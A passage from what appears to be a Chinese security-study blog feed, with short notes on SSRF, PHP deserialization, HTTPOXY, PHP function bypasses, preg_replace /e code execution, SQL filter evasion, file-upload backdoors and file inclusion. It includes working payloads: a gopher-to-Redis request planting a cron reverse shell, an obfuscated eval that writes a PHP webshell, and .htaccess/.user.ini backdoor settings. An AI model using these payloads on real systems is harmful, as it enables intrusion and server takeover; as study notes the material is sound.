class="symbol">Protocols:</span> dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line"><span class="symbol">Features:</span> AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy</span><br></pre></td></tr></table></figure><p>可以看到该版本支持很多协议，其中dict协议、gopher协议、http/s协议以及file协议使用较为广泛。</p><p>dict协议探测端口</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://172.0.0.1:22/info'</span></span><br><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://127.0.0.1:6379/info'</span></span><br></pre></td></tr></table></figure><p>利用gopher协议访问redis反弹shell</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'`</span></span><br></pre></td></tr></table></figure><p><strong>同时 <code>file_get_contents()</code>、<code>fopen()</code>、<code>fsocksopen()</code> 均可能造成SSRF漏洞</strong></p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者利用ssrf可以实现的攻击主要有5种：</p><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。</p><p>常用的利用思路：</p><p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p><p>1.内网探测: 内网主机信息收集</p><p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p><p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p><p>4.Payload Result: 返回相应Payload的执行信息</p><h3 id="常见的存在漏洞的参数："><a href="#常见的存在漏洞的参数：" class="headerlink" title="常见的存在漏洞的参数："></a>常见的存在漏洞的参数：</h3><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p><p>可以结合google语法及上述关键字进行搜索验证。</p><h3 id="常见的容易出问题的函数："><a href="#常见的容易出问题的函数：" class="headerlink" title="常见的容易出问题的函数："></a>常见的容易出问题的函数：</h3><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p><p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、排除法</p><p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p><p>如：<a href="https://link.jianshu.com?t=http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a>***/service?image=<a href="https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png</a></p><p><strong>排除法一：</strong></p><p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p><strong>排除法二：</strong></p><p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ul><li>禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</li><li>服务端需要认证交互，禁止非正常用户访问服务；</li><li>过滤输入信息，永远不要相信用户的输入，判断用户的输入是否是一个合理的URL地址</li><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法，如果web应用是去获取某一种类型的文件。那么在把返* 回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>禁止30x跳转</li><li>设置URL白名单或限制内网IP</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2020/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><blockquote><p>反序列化后会执行_wakeup()将file的值修改导致文件读取失败</p><p>把序列化语句中的1替换成2（CVE-2016-7124），即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见源码泄露</title>
      <link href="/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a>SWP</h1><p> 当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>  需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。<br>  意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>  例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTPOXY漏洞</title>
      <link href="/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">HTTPOXY漏洞</a></p><p> Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响 </p><table><thead><tr><th align="center">Language</th><th align="center">Environment</th><th align="center">HTTP client</th></tr></thead><tbody><tr><td align="center">PHP</td><td align="center">php-fpm mod_php</td><td align="center">Guzzle 4+ Artax</td></tr><tr><td align="center">Python</td><td align="center">wsgiref.handlers.CGIHandler twisted.web.twcgi.CGIScript</td><td align="center">requests</td></tr><tr><td align="center">Go</td><td align="center">net/http/cgi</td><td align="center">net/http</td></tr></tbody></table><a id="more"></a><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><blockquote><p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了… </p></blockquote><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><ul><li>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></li><li>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</li><li>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过</title>
      <link href="/2020/03/17/MD5%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/17/MD5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>比较md5加密后的值是否为0，可以把value变成数组可以绕过</p><blockquote><p>因为md5加密一个数组值为null，而null==0</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h2><blockquote><p><code>exif_imagetype()</code>函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如<code>gif</code>的文件头<code>GIF89a</code> </p></blockquote><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><blockquote><p>列出 参数目录 中的文件和目录</p></blockquote><a id="more"></a><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><blockquote><p>在指定的预定义字符前添加反斜杠。这些预定义字符是：</p><ul><li>单引号 (‘)</li><li>双引号 (“)</li><li>反斜杠 ()</li><li>NULL</li></ul></blockquote><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><blockquote><p>用数组即可 </p></blockquote><h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h2><blockquote><p>二次编码绕过</p></blockquote><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><blockquote><p>ereg()函数匹配数组的时候会返回null </p><p>用%00来绕过ereg()变量 </p></blockquote><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><blockquote><p>strpos()函数和ereg()函数一样也具有数组绕过漏洞 </p></blockquote><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><blockquote><p>is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较 </p></blockquote><h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote><p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p></blockquote><h2 id="curl-inti"><a href="#curl-inti" class="headerlink" title="curl_inti()"></a>curl_inti()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用 </span><br><span class="line">curl_setopt — 为给定的cURL会话句柄设置一个选项。</span><br><span class="line">        说明：</span><br><span class="line">          bool curl_setopt ( resource $ch , int $option , mixed $value )</span><br><span class="line">        参数:</span><br><span class="line">          ch：由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">          option：需要设置的CURLOPT_XXX选项。</span><br><span class="line">          value：将设置在option选项上的值。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span><br><span class="line">            CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span><br><span class="line">            CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            ###################</span><br><span class="line">            文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流</span><br><span class="line">curl_exec ：执行 cURL 会话</span><br><span class="line">curl_getinfo — 获取一个cURL连接资源句柄的信息</span><br><span class="line">                说明：</span><br><span class="line">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span><br><span class="line">                参数：</span><br><span class="line">                      ch 由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">                      opt：这个参数可能是以下常量之一:</span><br><span class="line">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span><br><span class="line">cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</span><br><span class="line">PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</span><br><span class="line">libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</span><br><span class="line">PHP中使用cURL实现Get和Post请求的方法</span><br><span class="line">这些函数在PHP 4.0.2中被引入。</span><br></pre></td></tr></table></figure><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p><p><strong>preg_replace函数原型：</strong></p><p>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [int limit])</p><p><strong>特别说明：</strong> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace (&quot;/(&lt;/?)(w+)([^&gt;]*&gt;)/e&quot;,</span><br><span class="line">&quot;\1.strtoupper(\2).\3&quot;,</span><br><span class="line">$html_body);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这将使输入字符串中的所有 HTML 标记变成大写。</p><p>安全威胁分析： 通常subject参数是由客户端产生的，客户端可能会构造恶意的代码，例如：</p><p>复制代码 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 如果我们提交下面的代码会怎么样呢？ ?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 密文对应的明文是：fputs(fopen(data/a.php,w),<?php eval($_POST[cmd])?>); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。</p><p>再来一个有难度的例子：</p><p>复制代码 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>提交 ?h=[php]phpinfo()[/php]，phpinfo()会被执行吗？ 肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。 有没有办法让它执行呢？</p><p>当然有。在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。为什么呢？ 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。</p><p>在这里我们需要通过{${}}构造出了一个特殊的变量，’test(“{${phpinfo()}}”)’，达到让函数被执行的效果（${phpinfo()}会被解释执行）。 可以先做如下测试：</p><p>复制代码 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure><p>phpinfo会被成功执行了。</p><p>如何防范这种漏洞呢？ 将’test(“\1”)’ 修改为”test(‘\1’)”，这样‘${phpinfo()}’就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。</p><blockquote><p>函数的第一个和第三个参数都是我们可以控制 </p><p>function complex($re, $str) {<br>   return preg_replace(‘/(‘ . $re . ‘)/ei’,’strtolower(“\1”)’,$str);<br>}</p><p>foreach($_GET as $re =&gt; $str) {<br>   echo complex($re, $str). “\n”;<br>}</p></blockquote><p> 官方 <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>/?.*</strong> ，值为 <strong>{${phpinfo()}}</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value);</span><br><span class="line">变成了语句： preg_replace(&apos;/(.*)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>过滤绕过</title>
      <link href="/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>注释绕过空格</p><blockquote><p>在MySQL中，用/**/来标记注释的内容。比如SQL查询：<br>select user() from dual<br>我们用注释替换空格，就可以变成：<br>select/**/user()/**/from/**/dual</p></blockquote><a id="more"></a><p>括号绕过空格 </p><blockquote><p>空格被过滤，但括号没有被过滤，可通过括号绕过。<br>我的经验是，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>括号绕过空格的方法，在time based盲注中，是屡试不爽的。<br>举例说明，我们有这样的一条SQL查询：<br>select user() from dual where 1=1 and 2=2<br>观察到user()可以算值，那么user()两边要加括号，变成：<br>select(user())from dual where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：<br>select(user())from dual where(1=1)and(2=2)</p><p><a href="http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109" target="_blank" rel="noopener">http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109</a>))<br>这条语句是猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟。它：</p><p>1) 既没有用到逗号、大小于符号<br>2) 也没有使用空格</p></blockquote><p>可尝试Tab替代空格</p><h4 id="绕过特殊字符过滤"><a href="#绕过特殊字符过滤" class="headerlink" title="绕过特殊字符过滤"></a>绕过特殊字符过滤</h4><blockquote><p>可以用chr()函数绕过</p></blockquote><h4 id="被过滤"><a href="#被过滤" class="headerlink" title="-- 被过滤"></a>-- 被过滤</h4><blockquote><p>用# </p></blockquote><h4 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h4><p>用%00</p><blockquote><p>例如:uni%00on </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><ul><li><code>gif</code>的文件头<code>GIF89a</code> </li></ul></blockquote><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果</p><p>在.user.ini中可以识别PHP_INI_PERDIR和PHP_INI_USER模式的INI设置<br>关于PHP_INI_*一共有四种：</p><a id="more"></a><blockquote><p>PHP_INI_USER 可在用户脚本以及.user.ini中设定</p></blockquote><blockquote><p>PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定</p></blockquote><blockquote><p>PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定</p></blockquote><blockquote><p>PHP_INI_ALL 可在任何地方设定</p></blockquote><p>auto_prepend_file</p><p>该配置项会让php文件在执行前先包含一个指定的文件，通过这个配置项，我们就可以来隐藏自己的后门</p><p>.user.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure><p>.user.ini利用条件</p><blockquote><p>服务器脚本语言为PHP</p><p>服务器使用CGI／FastCGI模式<br>上传目录下要有可执行的php文件<br>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache</p><p>但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p><p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，当对上传时的路径没有检测../时，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini</p></blockquote><p><a href="https://www.cnblogs.com/anbuxuan/p/11867129.html" target="_blank" rel="noopener">Apache中.htaccess文件利用的总结与新思路拓展</a></p><h2 id="htaccess文件利用"><a href="#htaccess文件利用" class="headerlink" title=".htaccess文件利用"></a>.htaccess文件利用</h2><h3 id="将特定文件作为php解析，用作后门。"><a href="#将特定文件作为php解析，用作后门。" class="headerlink" title="将特定文件作为php解析，用作后门。"></a>将特定文件作为php解析，用作后门。</h3><p>Module模式下写法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.jpg&quot;&gt;    SetHandler application/x-httpd-php  &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>甚至可以将 .htaccess本身作为php来解析，里面编写一句话。这块网络上相关资料很多。</p><h3 id="PHP环境下使用-auto-prepend-file-或-auto-append-file-创建后门"><a href="#PHP环境下使用-auto-prepend-file-或-auto-append-file-创建后门" class="headerlink" title="PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门"></a>PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门</h3><p>通过配置auto_append_file或auto_prepend_file可以向所有php文件中的开头或尾部插入指定的文件的内容。</p><p>在. htaccess中的写入如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;php_value auto_append_file &quot;/home/fdipzone/footer.php&quot;</span><br></pre></td></tr></table></figure><p>对于CGI/FastCGI模式 PHP 5.3.0 以上版本，还可以使用 在目录下创建.user.ini文件 。来引入该参数。写法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = 123.gif</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h2><h2 id="php中常见的文件包含函数有以下四种："><a href="#php中常见的文件包含函数有以下四种：" class="headerlink" title="php中常见的文件包含函数有以下四种："></a>php中常见的文件包含函数有以下四种：</h2><blockquote><p>include()<br>require()<br>include_once()<br>require()_once()</p></blockquote><p>include与require基本是相同的，除了错误处理方面:</p><a id="more"></a><p>include()，只生成警告（E_WARNING），并且脚本会继续<br>require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本<br>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p><blockquote><p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p></blockquote><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p> <code>file_get_contents</code> 是可以触发 <code>php://filter</code> </p><p>php://filter在双off的情况下也可以正常使用；</p><p>allow_url_fopen ：off/on</p><p>allow_url_include：off/on</p><blockquote><p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 </p><p>?path=php://filter/read=convert.base64-encode/resource=xxxxx.php</p></blockquote><h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><blockquote><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的</p></blockquote><p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain; base64,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模块注入</title>
      <link href="/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/</url>
      
